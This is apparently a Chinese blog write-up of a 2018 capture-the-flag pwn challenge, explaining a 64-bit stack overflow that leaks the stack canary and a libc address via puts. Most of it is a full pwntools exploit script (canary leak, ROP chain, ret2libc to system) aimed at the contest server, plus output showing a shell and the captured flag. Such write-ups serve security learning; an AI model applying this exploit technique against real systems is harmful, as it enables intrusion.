title: 安恒月赛pwn100
date: 2018-5-20
categories:
- PWN
---

# baby stack
- 一个简单的栈题,没有开启PIE,开启NX和Canary
- 程序里没有system函数,所以只能泄漏某函数真实地址然后算出偏移
- 由于puts函数的特性,可以打印出canary的值,泄漏内存
- 最后一发栈溢出,打印puts_got的值,注意程序是x64的,函数传参方式是寄存器传参
- 最后要知道,canary只需要泄漏一次就好
- 接收数据时.要利用好r.recv() r.recvuntil()

# exp
```python
from pwn import *
#r = process("./5b163293eb109")
r = remote("101.71.29.5",10001)
elf = ELF("./5b163293eb109")
#############################
libc_puts=0x6F690
poprdiret = 0x400873
poprsirdi = 0x400871
start = 0x400630
puts_got = 0x601020
puts_plt = 0x4005c0
#############################
success("start leak canary!")
r.sendline("a"*0x38)
r.recvuntil("a"*0x38)
a = r.recv(8)

canary = u64(a)&0xffffffffffffff00
print "canary:        %x"%canary
success("success leak canary!")

payload = "1"*56 + p64(canary) + "z"*8 #padding
payload += p64(poprdiret)
payload += p64(puts_got) 
payload += p64(puts_plt)
payload += p64(start)
# leak offset
r.sendline(payload)
raw_input()
r.send('\n')
r.recvuntil('1'*56+'\n>\n\n')
addr = r.recv(6).ljust(8,'\x00')
puts_addr = u64(addr)
print hex(puts_addr)
offset = puts_addr - libc_puts
# double stack overflower
payload = "1"*56 + p64(canary) + "z"*8
payload += p64(poprdiret)
payload += p64(offset + 0x18CD57)
payload += p64(offset + 0x45390)

r.sendline(payload)
r.sendline()

r.interactive()
```
```python
mozhucy@ubuntu:~/Desktop$ python exp.py 
[+] Opening connection to 101.71.29.5 on port 10001: Done
[*] '/home/mozhucy/Desktop/5b163293eb109'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] start leak canary!
canary:        882518a5ffcc4a00
[+] success leak canary!

0x7f67c3914690
[*] Switching to interactive mode

>11111111111111111111111111111111111111111111111111111111
>$ 


$ ls
a.out
bin
dev
flag
flag.txt
lib
lib32
lib64
$ cat flag.txt
flag{4d5fyun5rr6gyhu56fgyun56rgyuh65g7yu}
$  

```